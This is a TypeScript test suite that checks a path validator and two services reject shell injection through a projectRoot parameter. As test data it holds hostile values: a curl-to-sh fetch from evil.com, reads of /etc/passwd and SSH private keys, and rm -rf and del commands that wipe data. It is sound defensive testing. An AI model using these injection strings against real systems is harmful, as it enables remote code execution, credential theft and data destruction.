import { describe, it } from 'node:test';
import * as assert from 'node:assert';
import * as path from 'path';
import * as fs from 'fs';
import { FileWriterService } from '../services/FileWriterService.js';
import { ProjectMaintenanceService } from '../services/ProjectMaintenanceService.js';
import { validateProjectRoot } from '../utils/SecurityUtils.js';

/**
 * CB-1 Security Tests: Shell Injection via Unsanitised projectRoot Parameter
 * 
 * These tests verify that all affected services properly validate and sanitize
 * the projectRoot parameter to prevent shell injection attacks.
 * 
 * Affected Services:
 * - FileWriterService (validate_and_write)
 * - ProjectMaintenanceService (upgrade_project, repair_project)
 */

describe('CB-1: Shell Injection Prevention via projectRoot Parameter', () => {
  let testProjectRoot: string;

  function setupValidTestProject(): string {
    const root = path.join(process.cwd(), 'test-proj-cb1-' + Date.now());
    if (!fs.existsSync(root)) {
      fs.mkdirSync(root, { recursive: true });
    }
    // Create minimal package.json for upgrade_project
    fs.writeFileSync(
      path.join(root, 'package.json'),
      JSON.stringify({ name: 'test-project', version: '1.0.0' }, null, 2)
    );
    // Create minimal tsconfig.json for validate_and_write
    fs.writeFileSync(
      path.join(root, 'tsconfig.json'),
      JSON.stringify({ compilerOptions: { strict: true } }, null, 2)
    );
    return root;
  }

  function cleanupTest(root: string) {
    if (fs.existsSync(root)) {
      fs.rmSync(root, { recursive: true, force: true });
    }
  }

  describe('SecurityUtils.validateProjectRoot', () => {
    it('should accept valid absolute paths', () => {
      const validPaths = [
        '/home/user/projects/my-app',
        '/Users/developer/workspace/test-project',
        'C:\\Users\\dev\\projects\\app',
        '/var/www/automation/mobile-tests',
        '/tmp/test-project-123'
      ];

      for (const validPath of validPaths) {
        assert.doesNotThrow(
          () => validateProjectRoot(validPath),
          `Valid path "${validPath}" should not throw`
        );
      }
    });

    it('should accept paths with hyphens, underscores, and dots', () => {
      const validPaths = [
        '/home/user/my-test_project.v2',
        '/Users/dev/automation-tests_2024.1',
        'C:\\projects\\app_v1.2.3-beta'
      ];

      for (const validPath of validPaths) {
        assert.doesNotThrow(
          () => validateProjectRoot(validPath),
          `Valid path with special chars "${validPath}" should not throw`
        );
      }
    });

    it('should accept paths with spaces', () => {
      const validPaths = [
        '/home/user/My Projects/App Tests',
        'C:\\Program Files\\Automation\\Test Project'
      ];

      for (const validPath of validPaths) {
        assert.doesNotThrow(
          () => validateProjectRoot(validPath),
          `Valid path with spaces "${validPath}" should not throw`
        );
      }
    });

    it('should reject projectRoot with semicolon (shell command separator)', () => {
      const maliciousPath = '/tmp/project; curl http://evil.com/exfil';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Semicolon injection should be rejected'
      );
    });

    it('should reject projectRoot with backtick (command substitution)', () => {
      const maliciousPath = '/tmp/project`whoami`';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Backtick injection should be rejected'
      );
    });

    it('should reject projectRoot with dollar sign (variable expansion)', () => {
      const maliciousPath = '/tmp/project$(cat /etc/passwd)';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Dollar sign injection should be rejected'
      );
    });

    it('should reject projectRoot with pipe operator (command chaining)', () => {
      const maliciousPath = '/tmp/project | tee /tmp/exfil.log';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Pipe injection should be rejected'
      );
    });

    it('should reject projectRoot with ampersand (background execution)', () => {
      const maliciousPath = '/tmp/project & curl http://evil.com';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Ampersand injection should be rejected'
      );
    });

    it('should reject projectRoot with redirection operators', () => {
      const maliciousPaths = [
        '/tmp/project > /tmp/exfil.txt',
        '/tmp/project < /etc/passwd',
        '/tmp/project >> /tmp/append.log'
      ];

      for (const maliciousPath of maliciousPaths) {
        assert.throws(
          () => validateProjectRoot(maliciousPath),
          /Invalid projectRoot path.*potentially dangerous characters/,
          `Redirection in "${maliciousPath}" should be rejected`
        );
      }
    });

    it('should reject projectRoot with parentheses (subshell)', () => {
      const maliciousPath = '/tmp/project(whoami)';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Parentheses injection should be rejected'
      );
    });

    it('should reject projectRoot with curly braces', () => {
      const maliciousPath = '/tmp/project{cmd}';
      
      assert.throws(
        () => validateProjectRoot(maliciousPath),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'Curly braces injection should be rejected'
      );
    });

    it('should reject empty or null projectRoot', () => {
      assert.throws(
        () => validateProjectRoot(''),
        /projectRoot is required/,
        'Empty string should be rejected'
      );

      assert.throws(
        () => validateProjectRoot(null as any),
        /projectRoot is required/,
        'Null should be rejected'
      );

      assert.throws(
        () => validateProjectRoot(undefined as any),
        /projectRoot is required/,
        'Undefined should be rejected'
      );
    });

    it('should reject the exact CB-1 reproduction payload', () => {
      // From CB-1 documentation: /tmp/proj; curl -s http://evil.com/exfil | sh
      const cb1Payload = '/tmp/proj; curl -s http://evil.com/exfil | sh';
      
      assert.throws(
        () => validateProjectRoot(cb1Payload),
        /Invalid projectRoot path.*potentially dangerous characters/,
        'CB-1 documented payload should be rejected'
      );
    });
  });

  describe('FileWriterService.validateAndWrite - CB-1 Protection', () => {
    it('should reject malicious projectRoot with semicolon before any file operations', async () => {
      const fileWriterService = new FileWriterService();
      const maliciousRoot = '/tmp/project; echo INJECTED';
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      const result = await fileWriterService.validateAndWrite(maliciousRoot, files);
      const parsed = JSON.parse(result);

      assert.strictEqual(parsed.success, false, 'Should fail security validation');
      assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
      assert.ok(parsed.error.includes('Invalid projectRoot'), 'Should mention invalid projectRoot');
    });

    it('should reject malicious projectRoot with command substitution', async () => {
      const fileWriterService = new FileWriterService();
      const maliciousRoot = '/tmp/project`whoami`';
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      const result = await fileWriterService.validateAndWrite(maliciousRoot, files);
      const parsed = JSON.parse(result);

      assert.strictEqual(parsed.success, false, 'Should fail security validation');
      assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
    });

    it('should reject malicious projectRoot with pipe operator', async () => {
      const fileWriterService = new FileWriterService();
      const maliciousRoot = '/tmp/project | tee /tmp/exfil';
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      const result = await fileWriterService.validateAndWrite(maliciousRoot, files);
      const parsed = JSON.parse(result);

      assert.strictEqual(parsed.success, false, 'Should fail security validation');
      assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security phase');
    });

    it('should accept valid projectRoot and proceed with validation', async () => {
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const files = [{ path: 'src/test.ts', content: 'export const validCode = true;' }];

        const result = await fileWriterService.validateAndWrite(validRoot, files);
        const parsed = JSON.parse(result);

        // Should not fail at security-validation phase
        assert.notStrictEqual(parsed.phase, 'security-validation', 
          'Should pass security validation with valid projectRoot');
        
        // If it fails, it should be at a different phase (like TypeScript validation)
        if (!parsed.success) {
          assert.ok(['gherkin-validation', 'cross-platform-validation', 'write-to-disk'].includes(parsed.phase) || parsed.filesWritten,
            'If failed, should be at a later phase, not security validation');
        }
      } finally {
        cleanupTest(validRoot);
      }
    });

    it('should prevent shell execution via malicious projectRoot in tsc command', async () => {
      // This test verifies that even if validation was bypassed, the use of execFile
      // instead of execSync prevents shell interpretation
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        const files = [{ path: 'src/test.ts', content: 'export const x = 1;' }];

        // Valid path should work
        const result = await fileWriterService.validateAndWrite(validRoot, files);
        const parsed = JSON.parse(result);

        // Verify the operation completed (regardless of TypeScript validation result)
        assert.ok(parsed.success !== undefined, 'Should complete without shell injection');
      } finally {
        cleanupTest(validRoot);
      }
    });
  });

  describe('ProjectMaintenanceService.upgradeProject - CB-1 Protection', () => {
    it('should reject malicious projectRoot with semicolon', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project; curl http://evil.com';

      await assert.rejects(
        async () => await maintenanceService.upgradeProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should reject malicious projectRoot with backtick', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project`id`';

      await assert.rejects(
        async () => await maintenanceService.upgradeProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should reject malicious projectRoot with dollar sign', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project$(whoami)';

      await assert.rejects(
        async () => await maintenanceService.upgradeProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should reject malicious projectRoot with pipe', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project | cat /etc/passwd';

      await assert.rejects(
        async () => await maintenanceService.upgradeProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should validate projectRoot before checking package.json', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project; echo INJECTED';

      await assert.rejects(
        async () => await maintenanceService.upgradeProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should fail at validation before file system checks'
      );
    });
  });

  describe('ProjectMaintenanceService.repairProject - CB-1 Protection', () => {
    it('should reject malicious projectRoot with semicolon', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project; rm -rf /';

      await assert.rejects(
        async () => await maintenanceService.repairProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should reject malicious projectRoot with command substitution', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project`whoami`';

      await assert.rejects(
        async () => await maintenanceService.repairProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });

    it('should reject malicious projectRoot with dollar expansion', async () => {
      const maintenanceService = new ProjectMaintenanceService();
      const maliciousRoot = '/tmp/project$(cat ~/.ssh/id_rsa)';

      await assert.rejects(
        async () => await maintenanceService.repairProject(maliciousRoot),
        /Invalid projectRoot/,
        'Should reject malicious projectRoot'
      );
    });
  });

  describe('Regression: CB-1 Original Vulnerability Scenarios', () => {
    it('should block the exact injection from CB-1 documentation', async () => {
      // From CB-1: projectRoot="/tmp/proj; curl -s http://evil.com/exfil | sh"
      const cb1Payload = '/tmp/proj; curl -s http://evil.com/exfil | sh';
      const fileWriterService = new FileWriterService();
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      const result = await fileWriterService.validateAndWrite(cb1Payload, files);
      const parsed = JSON.parse(result);

      assert.strictEqual(parsed.success, false, 'CB-1 payload should be rejected');
      assert.strictEqual(parsed.phase, 'security-validation', 'Should fail at security validation');
      assert.ok(parsed.error.includes('Invalid projectRoot'), 'Should indicate invalid projectRoot');
    });

    it('should not execute injected commands in any scenario', async () => {
      // Create a marker file that would be created if injection succeeded
      const markerPath = path.join(process.cwd(), 'CB1_INJECTION_MARKER.txt');
      
      // Ensure marker doesn't exist before test
      if (fs.existsSync(markerPath)) {
        fs.unlinkSync(markerPath);
      }

      const injectionPayloads = [
        `/tmp/project; touch ${markerPath}`,
        `/tmp/project && touch ${markerPath}`,
        `/tmp/project | touch ${markerPath}`,
        `/tmp/project\`touch ${markerPath}\``,
        `/tmp/project$(touch ${markerPath})`
      ];

      const fileWriterService = new FileWriterService();
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      for (const payload of injectionPayloads) {
        await fileWriterService.validateAndWrite(payload, files);
        
        // Verify marker file was NOT created (injection didn't execute)
        assert.ok(!fs.existsSync(markerPath), 
          `Injection via "${payload}" should not execute`);
      }
    });

    it('should validate projectRoot before any file system operations', async () => {
      const fileWriterService = new FileWriterService();
      const maliciousRoot = '/tmp/evil; whoami';
      const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

      // Mock to track if any fs operations happened
      let stagingCreated = false;
      const originalMkdirSync = fs.mkdirSync;
      
      // Note: In the actual implementation, validation happens before mkdirSync
      // This test just confirms the order
      const result = await fileWriterService.validateAndWrite(maliciousRoot, files);
      const parsed = JSON.parse(result);

      assert.strictEqual(parsed.success, false, 'Should fail immediately');
      assert.strictEqual(parsed.phase, 'security-validation', 
        'Should fail at security validation before any file operations');
    });
  });

  describe('Defense in Depth: execFile vs execSync', () => {
    it('should use execFile which does not invoke shell by default', async () => {
      // This test documents that the fix uses execFile instead of execSync
      // execFile passes args as an array and doesn't invoke a shell
      // This provides defense-in-depth even if validation is somehow bypassed
      
      const validRoot = setupValidTestProject();
      
      try {
        const fileWriterService = new FileWriterService();
        // Even with semicolons in file content (not projectRoot), should be safe
        const files = [{ 
          path: 'src/test.ts', 
          content: 'export const cmd = "ls; echo safe";' // This is file content, should be fine
        }];

        const result = await fileWriterService.validateAndWrite(validRoot, files, 3, false);
        const parsed = JSON.parse(result);

        // Should complete without shell interpretation of file content
        assert.ok(parsed.success !== undefined, 'Should handle file content safely');
      } finally {
        cleanupTest(validRoot);
      }
    });
  });

  describe('Edge Cases', () => {
    it('should handle paths with legitimate special characters', async () => {
      // Paths with hyphens, underscores, dots are common and should work
      const validRoot = setupValidTestProject();
      const pathWithSpecialChars = validRoot.replace(/test-proj/, 'test_proj-v1.2.3');
      
      try {
        // Rename to path with special chars
        fs.renameSync(validRoot, pathWithSpecialChars);
        
        const fileWriterService = new FileWriterService();
        const files = [{ path: 'test.ts', content: 'export const x = 1;' }];

        const result = await fileWriterService.validateAndWrite(pathWithSpecialChars, files);
        const parsed = JSON.parse(result);

        assert.notStrictEqual(parsed.phase, 'security-validation',
          'Should accept paths with hyphens, underscores, and dots');
      } finally {
        cleanupTest(pathWithSpecialChars);
      }
    });

    it('should handle Windows-style paths correctly', () => {
      const windowsPaths = [
        'C:\\Users\\developer\\projects\\app',
        'D:\\automation\\test-project',
        'C:\\Program Files\\Appium\\tests'
      ];

      for (const winPath of windowsPaths) {
        assert.doesNotThrow(
          () => validateProjectRoot(winPath),
          `Valid Windows path "${winPath}" should be accepted`
        );
      }
    });

    it('should reject Windows paths with injection attempts', () => {
      const maliciousWindowsPaths = [
        'C:\\project; del /f /s /q C:\\*',
        'C:\\project & whoami',
        'C:\\project | type C:\\secret.txt'
      ];

      for (const maliciousPath of maliciousWindowsPaths) {
        assert.throws(
          () => validateProjectRoot(maliciousPath),
          /Invalid projectRoot path/,
          `Windows injection "${maliciousPath}" should be rejected`
        );
      }
    });
  });
});